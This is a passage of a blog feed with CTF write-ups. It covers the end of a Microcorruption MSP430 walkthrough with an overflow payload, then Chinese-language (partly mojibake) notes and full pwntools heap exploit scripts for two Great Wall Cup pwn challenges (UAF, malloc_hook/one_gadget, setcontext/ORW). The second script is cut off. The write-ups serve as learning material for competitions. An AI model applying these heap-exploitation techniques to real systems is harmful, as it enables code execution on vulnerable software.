class="line">5870 4c38      subc.b0x384c(pc), r8</span><br><span class="line">c93c           jmp$+0x194</span><br><span class="line">ff36           jge$-0x200</span><br><span class="line">0e01           rrar14</span><br><span class="line">7f3e           jmp$-0x300</span><br><span class="line">fa55 aeef      add.b@r5+, -0x1052(r10)</span><br><span class="line">051c           rrcr5</span><br><span class="line">242c           jc$+0x4a</span><br><span class="line">3c56           add@r6+, r12</span><br><span class="line">13af e57b      dadd0x7be5(r15), 4</span><br><span class="line">8abf 3040      bitr15, 0x4030(r10)</span><br><span class="line">c537           jge$-0x74</span><br><span class="line">656e           addc.b@r14, r5</span><br><span class="line">8278 9af9      subcr8, &amp;0xf99a</span><br><span class="line">9d02 be83      call-0x7c42(r13)</span><br><span class="line">b38c e181      sub@r12+, 8</span><br><span class="line">3ad8           bis@r8+, r10</span><br><span class="line">395a           add@r10+, r9</span><br><span class="line">fce3 4f03      xor.b#-0x1, 0x34f(r12)</span><br><span class="line">8ec9 9395      bicr9, -0x6a6d(r14)</span><br><span class="line">4a15           rra.br10</span><br><span class="line">ce3b           jl$-0x62</span><br><span class="line">fd1e           call@r13+</span><br><span class="line">7779           subc.b@r9+, r7</span><br><span class="line">c9c3 5ff2      bic.b#0x0, -0xda1(r9)</span><br><span class="line">3dc7           bic@r7+, r13</span><br><span class="line">5953           add.b#0x1, r9</span><br><span class="line">8826           jz$-0x2ee</span><br><span class="line">d0b5 d9f8 639e bit.b-0x727(r5), -0x619d(pc)</span><br><span class="line">e970 01cd      subc.b@pc, -0x32ff(r9)</span><br><span class="line">2119           rra@sp</span><br><span class="line">ca6a d12c      addc.br10, 0x2cd1(r10)</span><br><span class="line">97e2 7538 96c5 xor&amp;0x3875, -0x3a6a(r7)</span><br><span class="line">8f28           jnc$+0x120</span><br><span class="line">d682 1be5 ab20 sub.b&amp;0xe51b, 0x20ab(r6)</span><br><span class="line">7389           sub.b@r9+, 4</span><br><span class="line">48aa           dadd.br10, r8</span><br><span class="line">1fa3           dincr15</span><br><span class="line">472f           jc$-0x170</span><br><span class="line">a564 de2d      addc@r4, 0x2dde(r5)</span><br><span class="line">b710           swpb@r7+</span><br><span class="line">9081 5205 8d44 sub0x552(sp), 0x448d(pc)</span><br><span class="line">cff4 bc2e      and.br4, 0x2ebc(r15)</span><br><span class="line">577a d5f4      subc.b-0xb2b(r10), r7</span><br><span class="line">a851 c243      add@sp, 0x43c2(r8)</span><br><span class="line">277d           subc@r13, r7</span><br><span class="line">a4ca 1e6b      bic@r10, 0x6b1e(r4)</span><br></pre></td></tr></table></figure><p>We can find that the code segment â€œcall    #0x2464â€ was called in many places.</p><p>The code segment : </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1e41 0200      mov0x2(sp), r14</span><br><span class="line">0212           pushsr</span><br><span class="line">0f4e           movr14, r15</span><br><span class="line">8f10           swpbr15</span><br><span class="line">024f           movr15, sr</span><br><span class="line">32d0 0080      bis#0x8000, sr</span><br><span class="line">b012 1000      call#0x10&#x2F;&#x2F; interrupt</span><br><span class="line">3241           popsr</span><br><span class="line">3041           ret</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupi52jvrkj61kf0u0qc002.jpg" alt=""></p><p>The program calls the interrupt for user input in the subsequent execution. After entering the password, there is a â€œcmpâ€ instruction that follows, which can be seen to compare with the password we entered. Notice the value of the pc is 2448 now. So we can break at 2448, then we can input â€œ#021aâ€ to observe the program.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupizmo924j616k0padjh02.jpg" alt=""></p><p>Oh! Sure enough, thatâ€™s it.</p><h2 id="Whitehorse"><a href="#Whitehorse" class="headerlink" title="Whitehorse"></a>Whitehorse</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupj4kd1g4j61d60u0ahy02.jpg" alt=""></p><p>When set a breakpoint at ret of the function, we can find that ret address can be overflowed so we can hijack the program flow.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gupjrwu60fj61zi0oin3z02.jpg" alt=""></p><p>The verfication of the password relies on the â€œr15â€ register. So we can hijack the program flow to control the â€œr15â€ register.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guptf243r6j614a0man0p02.jpg" alt=""></p><p>But after testing, I found that hijacking the â€œr15â€ register seemed a bit difficult, so I changed my mind and hijacked it to where the interrupt is handled. According to the user manual, just pass in parameter â€œ0x7fâ€.</p><p>payload: 6161616161616161616161616161616160447f</p><h2 id="Montevideo"><a href="#Montevideo" class="headerlink" title="Montevideo"></a>Montevideo</h2><p>(To be continued.)</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿åŸæ¯wp</title>
      <link href="2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
      <url>2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/09/20/eIGMuxfXNhL9qcv.png" alt=""></p><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>unhexç„¶åbase64 decode</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>ç­¾åˆ°UAFé¢˜ï¼Œlibc-2.23.soä¸‹çš„åˆ©ç”¨ï¼Œè¿˜æœ‰ä¸ªoff by oneå’Œåé—¨ï¼Œuafå°±å¤Ÿäº†ï¼Œåé—¨ä¹Ÿä¸çŸ¥é“æ€ä¹ˆç”¨ (èµ›åå¬å¸ˆå‚…è¯´çˆ†ç ´1/256 ???ï¼‰<br>uafæ‰“ioæ³„éœ²åœ°å€ï¼Œreallocè°ƒæ ˆå¸§ï¼Œone_gadgetä¸€æŠŠæ¢­ï¼Œä¹‹å‰æ²¡è°ƒè¿‡ï¼Œè°ƒäº†å¾ˆä¹…QAQï¼Œå¤ªèœäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_backdoor = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">666</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;input size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;input context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_backdoor))</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            <span class="keyword">if</span> libc_path_local:</span><br><span class="line">                io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">                libc = ELF(libc_path_local)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io = process(challenge)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;47.104.175.110&quot;</span>, <span class="number">20066</span>)</span><br><span class="line">            <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">                libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line">        printf = backdoor()</span><br><span class="line">        echo(<span class="string">&#x27;PRINTF:&#x27;</span> + <span class="built_in">hex</span>(printf))</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x90</span>)</span><br><span class="line">        add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">&#x27;\xe0\n&#x27;</span>)</span><br><span class="line">        edit(<span class="number">4</span>, <span class="string">&#x27;\xdd\x65\n&#x27;</span>)</span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">        payload = <span class="number">3</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(<span class="number">0xfbad1800</span>)</span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00\n&#x27;</span></span><br><span class="line">        edit(<span class="number">5</span>, payload)</span><br><span class="line">        leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">192</span></span><br><span class="line">        echo(<span class="string">&#x27;LEAK:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">        libc_address = leak - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">        echo(<span class="string">&#x27;LIBC:&#x27;</span> + <span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line">        __malloc_hook = libc_address + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        ogList = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">        oglocal = [<span class="number">0x3f43a</span>]</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">        og = libc_address + ogList[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># og = libc_address + oglocal[0]</span></span><br><span class="line">        <span class="comment"># realloc_hook = libc_address + libc.sym[&#x27;__realloc_hook&#x27;]</span></span><br><span class="line">        realloc = libc_address + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        payload = (<span class="number">0x13</span> - <span class="number">0x8</span>) * <span class="string">&#x27;a&#x27;</span> + p64(og) + p64(realloc + <span class="number">0xb</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        edit(<span class="number">7</span>, payload)</span><br><span class="line"></span><br><span class="line">        raw_input()</span><br><span class="line">        add(<span class="number">8</span>, <span class="number">64</span>)</span><br><span class="line">        <span class="comment"># gdba()</span></span><br><span class="line">        ia()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>æ¼æ´æ˜¯uafï¼Œlibc ç‰ˆæœ¬æ˜¯2.27-3ubuntu1.4ï¼Œè·Ÿlibc2.31æœºåˆ¶å·®ä¸å¤šï¼Œæœ‰keyï¼Œä½†æ˜¯ä¸ç”¨ç®¡ï¼Œç›´æ¥editå®Œäº‹<br>æœ‰showåŠŸèƒ½ï¼Œä½†æ˜¯åªèƒ½ç”³è¯·0x10-0x60å¤§å°çš„å †å—ï¼Œè€Œä¸”å¼€äº†æ²™ç®±ï¼Œå †éƒ¨ç»“æ„å¾ˆä¹±ï¼Œå…ˆæ˜¯ä¸€é¡¿æ•´ç†å †ç»“æ„ç„¶åä¸€é€šoverlapæ„é€ ä¸€ä¸ªunsorted binå‡ºæ¥leakåœ°å€<br>ç”±äºå¼€äº†æ²™ç®±ï¼Œè€ƒè™‘__free_hookæ”¹ä¸ºsetcontext+53æ§åˆ¶å¯„å­˜å™¨<br>setcontextæ‰€ç”¨çš„payloadå¤ªé•¿ï¼Œ0x60å¤§å°çš„chunkå†™ä¸è¿›å»ï¼Œå°±ç”¨äº†ä¸¤å—0x60å¤§å°çš„chunkå’Œä¸€å—0x50å¤§å°çš„chunkæ¥å†™ï¼Œç”±äºä¹‹å‰ä¼ªé€ äº†ubï¼Œå¦‚æœä¸æ¸…ç©ºåœ¨åç»­mallocå’Œfreeçš„æ—¶å€™å¯èƒ½ä¼šæŠ¥å„ç§é”™è¯¯ï¼Œæ‰€ä»¥å…ˆæ¸…ç©ºä¸€äº›å¿…è¦çš„éæ³•chunkï¼Œç„¶åç”±äºpayloadä¸èƒ½æ–­ï¼Œä½†æ˜¯headerä¼šé˜»æ–­payloadï¼Œæ‰€ä»¥åˆæ˜¯ä¸€é¡¿overlapä¼ªé€ å‡ºæ¥ä¸‰ä¸ªå‡çš„chunkæ¥è¦†ç›–header<br>ç„¶åå°±æ˜¯orw shellcodeä¸€æŠŠæ¢­<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> six <span class="keyword">import</span> indexbytes</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc-2.27.so&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;47.104.175.110&quot;</span>, <span class="number">61608</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwn&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;input size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;input context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>():</span></span><br><span class="line">    edit(<span class="number">11</span>, <span class="number">0x60</span> * <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">12</span>, <span class="number">0x50</span> * <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    edit(<span class="number">13</span>, <span class="number">0x60</span> * <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        add(i, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    fake = p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)   <span class="comment"># Forge a fake header.</span></span><br><span class="line">    edit(<span class="number">0</span>, fake)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:])</span><br><span class="line">    fake_chunk = heap + <span class="number">0xf70</span></span><br><span class="line">    echo(<span class="string">&#x27;HEAP:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    echo(<span class="string">&#x27;FAKE_CHUNK:&#x27;</span> + <span class="built_in">hex</span>(fake_chunk))</span><br><span class="line">    edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, p64(fake_chunk) + p64(heap))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">11</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">11</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))      <span class="comment"># fake ub</span></span><br><span class="line">    edit(<span class="number">10</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))  </span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">    echo(<span class="string">&#x27;LEAK:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc_base = leak - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    setcontext_door = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    syscall = libc_base + libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">    echo(<span class="string">&#x27;SYSCALL:&#x27;</span> + <span class="built_in">hex</span>(syscall))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#=========================setcontext===========================</span></span><br><span class="line"></span><br><span class="line">    fake_rsp = free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span></span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = fake_rsp</span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = fake_rsp</span><br><span class="line">    frame.rip = syscall</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(frame))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">12</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    edit(<span class="number">12</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    fake_chunk = heap + <span class="number">0x1020</span></span><br><span class="line">    edit(<span class="number">12</span>, p64(fake_chunk) + p64(heap))</span><br><span class="line"></span><br><span class="line">    